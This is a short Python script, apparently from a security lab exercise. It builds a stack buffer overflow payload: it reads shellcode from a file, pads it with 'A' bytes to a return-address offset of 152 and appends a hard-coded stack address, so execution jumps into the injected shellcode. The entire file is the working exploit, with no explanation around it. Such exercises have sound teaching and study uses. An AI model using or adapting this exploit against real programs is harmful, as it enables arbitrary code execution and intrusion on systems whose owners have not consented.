#!/usr/bin/env python3

import sys

sc = open(sys.argv[1], "rb")

payload = sc.read()
print('Shellcode length %d' % len(payload), file=sys.stderr)

#retaddr = b'\x7f\xff\xff\xff\xdc\x88'
retaddr_off = 152# you need to find
buffer_addr = b'\xf0\xdb\xff\xff\xff\x7f'

extra_bytes = retaddr_off - len(payload)

payload = payload + b'A' * extra_bytes + buffer_addr

print("Press enter when ready...", file=sys.stderr)
sys.stdin.buffer.readline()

sys.stdout.buffer.write(payload)

